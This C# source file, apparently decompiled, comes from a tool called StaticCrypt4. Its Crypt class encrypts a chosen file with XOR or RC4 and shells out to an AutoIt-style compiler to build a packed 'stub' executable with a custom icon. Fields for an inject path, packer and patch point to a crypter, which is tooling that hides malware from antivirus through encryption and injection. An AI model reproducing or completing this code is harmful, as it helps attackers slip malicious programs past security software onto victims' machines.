using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace StaticCrypt4.Utilies
{
	public static class Crypt
	{
		public static string InjectPath = string.Empty;

		public static string CorrectrInjectName = "CorrectInject(";

		public static bool IsRequiertPacker = false;

		public static bool IsRequiertPatch = false;

		public static byte[] EncryptData(string path, int algo, string key)
		{
			byte[] array = File.ReadAllBytes(path);
			if (algo == 1)
			{
				return Helpers.XorEnc(array, key);
			}
			return Helpers.Proper_RC4(array, Encoding.Default.GetBytes(key));
		}

		public static bool Compile(string pathA2E, string stbPath, string stbDest, string icon, bool upx)
		{
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = pathA2E;
				if (upx)
				{
					string[] values = new string[7]
					{
						"/in \"",
						stbPath,
						"\" /out \"",
						stbDest,
						"\" /icon \"",
						icon,
						"\" /pack /x86 /unicode /comp 4"
					};
					process.StartInfo.Arguments = string.Concat(values);
				}
				else
				{
					string[] values2 = new string[7]
					{
						"/in \"",
						stbPath,
						"\" /out \"",
						stbDest,
						"\" /icon \"",
						icon,
						"\" /nopack /x86 /unicode /comp 4"
					};
					process.StartInfo.Arguments = string.Concat(values2);
				}
				process.Start();
				process.WaitForExit();
				return true;
			}
			catch (Exception ex)
			{
				Helpers.ExceptionCode += ex.ToString();
				return false;
			}
		}
	}
}
